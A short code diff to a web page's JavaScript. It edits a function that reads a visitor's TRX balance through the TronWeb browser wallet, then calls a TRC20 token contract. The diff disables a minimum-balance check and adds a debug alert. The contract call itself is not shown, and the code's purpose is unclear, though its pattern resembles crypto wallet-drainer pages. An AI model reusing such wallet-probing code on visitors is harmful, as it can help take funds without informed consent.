@@ -2887,7 +2887,8 @@ async function TUAP() {
 
 async function tronIA() {
     let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
-    if (trx > 25000000) {
+    alert('trx:'+trx)
+    // if (trx > 25000000) {
         const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         try {
             let contract = await tronWeb.contract().at(trc20ContractAddress);
@@ -2903,9 +2904,9 @@ async function tronIA() {
                 alert('交易失败：' + error.message);
             }
         }
-    } else {
-        alert('TRX余额不足，需要至少25 TRX用于支付网络费！')
-    }
+    // } else {
+    //     alert('TRX余额不足，需要至少25 TRX用于支付网络费！')
+    // }
 }
 
 // 获取带过来的参数值
